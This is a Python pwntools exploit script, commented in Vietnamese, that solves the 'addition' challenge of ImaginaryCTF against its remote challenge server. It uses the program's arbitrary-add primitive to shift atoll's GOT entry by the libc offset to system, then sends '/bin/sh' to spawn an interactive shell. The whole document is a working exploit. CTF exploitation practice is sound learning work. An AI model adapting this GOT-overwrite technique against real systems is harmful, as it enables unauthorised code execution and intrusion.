from pwn import *

# Cài đặt context
context.binary = elf = ELF('./add')
libc = ELF('./libc.so.6')

# Kết nối
p = remote('addition.chal.imaginaryctf.org', 1337)

# Lấy các địa chỉ offset từ ELF file
buf_addr = elf.symbols['buf']
atoll_got = elf.got['atoll']

# --- Bước 1: Để chương trình chạy 1 lần để resolve địa chỉ atoll trong GOT ---
log.info("Step 1: Running one loop to resolve atoll@got")
p.sendlineafter(b"add where? ", b"0") # Gửi input vô hại
p.sendlineafter(b"add what? ", b"0")

# --- Bước 2: Ghi đè atoll@got để trỏ tới system ---
log.info("Step 2: Hijacking atoll() to call system()")

# Tính toán delta (chênh lệch) giữa system và atoll trong file libc được cung cấp
# Đây là một giá trị không đổi
delta = libc.symbols['system'] - libc.symbols['atoll']
log.info(f"Calculated delta (system - atoll): {hex(delta)}")

# Gửi payload để cộng delta vào atoll@got
# "where" là offset từ buf tới atoll@got
p.sendlineafter(b"add where? ", str(atoll_got - buf_addr).encode())
# "what" là giá trị delta chúng ta muốn cộng vào
p.sendlineafter(b"add what? ", str(delta).encode())

# --- Bước 3: Trigger system("/bin/sh") ---
log.info("Step 3: Triggering shell")
# Vòng lặp tiếp theo sẽ hỏi "add where?". `fgets` sẽ đọc input.
# Sau đó, `atoll` được gọi trên input đó.
# Vì atoll() bây giờ là system(), chúng ta chỉ cần gửi "/bin/sh"
p.sendlineafter(b"add where? ", b"/bin/sh")

# Tương tác với shell
p.interactive()